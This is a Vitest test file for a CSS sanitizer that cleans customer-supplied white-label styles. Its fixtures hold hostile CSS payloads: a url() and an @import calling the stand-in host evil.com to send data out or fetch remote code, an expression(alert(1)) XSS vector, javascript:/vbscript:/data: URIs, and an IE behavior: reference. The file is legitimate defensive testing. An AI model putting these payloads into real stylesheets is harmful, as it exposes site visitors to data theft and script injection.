import { describe, it, expect } from 'vitest'
import { sanitizeCss } from '@/lib/css-sanitizer'

describe('CSS sanitizer — white-label customCss', () => {
  it('keeps harmless properties untouched', () => {
    const css = '.btn { color: red; margin: 4px; font-size: 14px; }'
    expect(sanitizeCss(css)).toBe(css)
  })

  it('strips url() to prevent image-based exfiltration', () => {
    const css = 'body { background-image: url(https://evil.com/log?data=secret); }'
    const out = sanitizeCss(css)
    expect(out).not.toMatch(/evil\.com/)
    expect(out).toContain('url()')
  })

  it('removes expression() (IE XSS vector)', () => {
    const css = '.x { width: expression(alert(1)); }'
    const out = sanitizeCss(css)
    expect(out).not.toMatch(/expression/)
    expect(out).not.toMatch(/alert/)
  })

  it('removes @import directives (remote CSS fetch)', () => {
    const css = "@import 'https://evil.com/steal.css'; .a { color: blue; }"
    const out = sanitizeCss(css)
    expect(out).not.toMatch(/evil\.com/)
    expect(out).not.toMatch(/@import/)
    expect(out).toContain('.a')
  })

  it('neutralizes javascript: / vbscript: / data: URI schemes', () => {
    const css = '.a { background: javascript:alert(1); } .b { cursor: vbscript:xx; } .c { content: data:text/html,hi; }'
    const out = sanitizeCss(css)
    expect(out).not.toMatch(/javascript:/i)
    expect(out).not.toMatch(/vbscript:/i)
    expect(out).not.toMatch(/data:/i)
  })

  it('removes behavior: (IE-specific XSS)', () => {
    const css = '.x { behavior: url(xss.htc); }'
    const out = sanitizeCss(css)
    expect(out).not.toMatch(/behavior:/)
  })

  it('strips comments that could hide payloads', () => {
    const css = '/* @import url(hack) */ .a { color: red; }'
    const out = sanitizeCss(css)
    expect(out).not.toMatch(/@import/)
    expect(out).toContain('.a')
  })

  it('handles empty / whitespace input', () => {
    expect(sanitizeCss('')).toBe('')
    expect(sanitizeCss('   \n  ')).toBe('')
  })
})
